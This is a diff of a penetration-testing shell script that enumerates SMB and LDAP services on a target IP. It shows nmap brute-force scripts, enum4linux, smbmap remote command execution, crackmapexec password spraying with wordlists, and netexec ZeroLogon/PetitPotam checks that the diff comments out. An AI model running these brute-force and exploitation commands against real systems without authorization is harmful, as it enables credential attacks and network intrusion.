@@ -109,7 +109,7 @@ nmap --script "smb-brute,smb-enum-shares.nse,smb-enum-users.nse,smb-enum*,smb-pr
 enum4linux -a -v $IP | tee -a $results_dir/SMB_overall_results.txt
 # -M zerologon: Scan for ZeroLogon
 # -M petitpotam: Scan for PetitPotam
-netexec smb $IP -u '' -p '' -M zerologon -M petitpotam | tee -a $results_dir/SMB_overall_results.txt
+#netexec smb $IP -u '' -p '' -M zerologon -M petitpotam | tee -a $results_dir/SMB_overall_results.txt
 # Recursive
 smbmap -H $IP -R | tee -a $results_dir/SMB_overall_results.txt
 # -N: No password
@@ -118,7 +118,7 @@ smbclient -N -L $results_dir/list_hosts | tee -a $results_dir/SMB_overall_result
 # Execute a command
 smbmap -u username -p password --host-file $results_dir/list_hosts -x 'ipconfig' | tee -a $results_dir/SMB_overall_results.txt
 # Find aother user
-crackmapexec smb $IP -u username -p password --users | tee -a $results_dir/SMB_overall_results.txt
+crackmapexec smb $IP -u /home/vaptadmin/jai/usernames.txt -p /home/vaptadmin/jai/password.txt --users | tee -a $results_dir/SMB_overall_results.txt
 #crackmapexec smb $IP -u users.txt -p password --continue-on-success | tee -a $results_dir/SMB_overall_results.txt
 #Perform RID cycling attack against a DC with SMB null sessions allowed with impacket-lookupsid
 # Anonymous logon
@@ -137,9 +137,9 @@ echo -e $RED_LINE
 
 nmap --script "ldap-brute,ldap-search,ldap-* and not brute" --script-args "ldap.base='cn=users,dc=cqure,dc=net'" -p 389 $IP | tee $results_dir/LDAP_overall_results.txt
 # -k: Use Kerberos authentication
-netexec ldap $IP -u usernames.txt -p '' -k | tee -a $results_dir/LDAP_overall_results.txt
+#netexec ldap $IP -u usernames.txt -p '' -k | tee -a $results_dir/LDAP_overall_results.txt
 # --trusted-for-delegation: Enumerate computers and users with the flag `TRUSTED_FOR_DELEGATION`
-netexec ldap $IP -u username -p password --trusted-for-delegation | tee -a $results_dir/LDAP_overall_results.txt
+#netexec ldap $IP -u username -p password --trusted-for-delegation | tee -a $results_dir/LDAP_overall_results.txt
 
 echo -e $RED_LINE
 
